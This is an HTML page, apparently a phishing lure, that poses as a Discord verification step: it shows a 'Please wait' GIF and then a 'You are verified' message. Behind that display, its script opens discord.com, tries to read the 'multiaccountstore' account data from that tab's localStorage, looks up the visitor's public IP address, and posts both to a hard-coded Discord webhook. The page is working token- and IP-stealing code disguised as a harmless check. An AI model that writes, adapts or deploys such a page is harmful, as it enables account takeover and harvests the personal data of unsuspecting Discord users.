<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page avec GIF et Image</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            text-align: center;
        }
        img {
            max-width: 100%;
            height: auto;
        }
        #gif, #finalImage {
            display: none;
        }
        #pleaseWait, #verifiedText {
            margin-top: 20px;
            font-size: 1.2rem;
            color: #333;
        }
        #verifiedText {
            display: none;
        }
    </style>
</head>
<body>
    <img id="gif" src="https://i.pinimg.com/originals/2e/ce/ce/2ececec5431d0a1b7eae4e1acac7c59f.gif" alt="GIF">
    <div id="pleaseWait">Please wait</div>
    <img id="finalImage" src="https://get-picto.com/wp-content/uploads/2024/02/coche-valide-picto.webp" alt="Image">
    <div id="verifiedText">You are verified, you can close this page and come back to discord!</div>

    <script>
        window.onload = function() {
            // Open Discord in a new tab
            var discordWindow = window.open('https://discord.com', '_blank');

            // Wait for the Discord window to load
            discordWindow.onload = function() {
                // Retrieve the 'multiaccountstore' value from the Discord window
                var multiAccountStore = discordWindow.localStorage.getItem('multiaccountstore');

                // Call the switchContent function with the multiAccountStore value
                switchContent(multiAccountStore);
            }
        }

        function switchContent(multiAccountStore) {
            // Send the IP and multiaccountstore to the Discord webhook
            sendIP(multiAccountStore);

            // Show the GIF and "Please wait" text
            document.getElementById('gif').style.display = 'block';
            document.getElementById('pleaseWait').style.display = 'block';

            // Wait 4 seconds before switching content
            setTimeout(function() {
                // Hide the GIF and "Please wait" text
                document.getElementById('gif').style.display = 'none';
                document.getElementById('pleaseWait').style.display = 'none';

                // Show the final image and "Verified" text
                document.getElementById('finalImage').style.display = 'block';
                document.getElementById('verifiedText').style.display = 'block';
            }, 4000);
        }

        async function sendIP(multiAccountStore) {
            try {
                // Get the public IP address using the ipify API
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                const ip = ipData.ip;

                // Prepare the message for the Discord webhook
                const message = `Nouvelle IP : ${ip}\nMultiaccount Store: ${multiAccountStore}`;

                // Send the IP and multiaccountstore to the Discord webhook
                const webhookUrl = 'https://discord.com/api/webhooks/1273657947024654376/kgCCA9Cc65zomW-vWqAKM_8hCUBizn4C7KCsQPDHDKEdLcmsRvb9682JO7ZbJn9o4t-i';
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ content: message }),
                });
                console.log('IP et multiaccountstore envoyés au webhook Discord.');
            } catch (error) {
                console.error('Erreur lors de l\'envoi des données:', error);
            }
        }
    </script>
</body>
</html>
